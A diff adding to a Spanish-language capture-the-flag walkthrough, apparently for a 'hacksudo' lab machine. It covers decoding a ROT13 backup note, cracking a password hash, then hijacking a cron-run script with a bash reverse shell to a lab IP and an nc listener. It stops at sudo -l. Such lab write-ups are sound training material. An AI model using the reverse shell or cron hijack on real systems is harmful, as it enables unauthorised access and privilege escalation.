@@ -118,4 +118,70 @@ Usaremos este comando con docker:
 
 > ⚠️ IMPORTANTE: Tener tanto el archivo vishal.jpg como el wordlist que usaremos en la misma carpeta
 
+Esto es lo que recibimos al ejecutar el comando anterior:
+
 <img src="https://i.gyazo.com/e509cd614352dd3dacfa16f7349f2ef4.png">
+
+Siguiendo leeremos el archivo .out que muestra esto concretamente:
+
+```
+onpxhc bs unpxfhqb znpuvar hfre
+hfre ivfuny
+cnffjbeq 985nn195p09so7q64n4oo24psr51so1s13rop444p494r765rr99q6p3rs46557p757787s8s5n6r0260q2r0r846q263sosor1311p884oo0os9792s8778n4434327
+```
+
+Tras una buena búsqueda entendemos que puede estar cifrado en **ROT13**, sabiendo esto lo pasaremos por el [CyberChef](https://gchq.github.io/CyberChef/) y nos dara este resultado:
+
+```
+backup of hacksudo machine user
+user vishal
+password 985aa195c09fb7d64a4bb24cfe51fb1f13ebc444c494e765ee99d6c3ef46557c757787f8f5a6e0260d2e0e846d263fbfbe1311c884bb0bf9792f8778a4434327
+```
+
+Con esto copiaremos el hash de la password y la llevaremos a [CrackStation](https://crackstation.net/) y este sera el resultado:
+
+```
+Result: hacker
+```
+
+Con esto ya tenemos las credenciales del usuario **vishal**
+
+Con el comando ```su vishal``` y poniendo la contraseña sacada anteriormente completaremos el primer Movimiento Lateral.
+
+
+## Movimiento Lateral II
+
+### linPEAS
+
+Para el siguiente Movimiento Lateral para convertirnos como el usuario hacksudo primero pasaremos el [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) para ver que podemos recibir
+
+Buscando la información sacada por parte de [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) encontramos esta línea:
+
+```
+*/1 *   * * *   hacksudo /home/hacksudo/./getmanager
+```
+
+Lo que haremos es leer ese archivo a ver que podemos encontrar.
+
+En este caso encontraremos otra dirección que es esta: ```/home/vishal/office/manage.sh```
+
+### Reverse Shell
+
+Leeremos el archivo viendo que esta en bash y le añadiremos una reverse shell para ver si podemos escalar privilegios.
+
+Usaremos este reverse shell: ```bash -i >& /dev/tcp/192.168.221.4/4444 0>&1```
+
+Y obviamente podremos un puerto en escucha: ```rlwrap nc -nvlp 4444```
+
+Con esto finalizamos el segundo Movimiento Lateral para conseguir el usuario **hacksudo**
+
+## Búsqueda de vulnerabilidades
+
+### SUDO -L
+
+Para ver que puede ejecutar este usuario como root usaremos el comando ```sudo -l```
+
+El resultado es este:
+```
+(root) NOPASSWD: /usr/bin/scp
+```
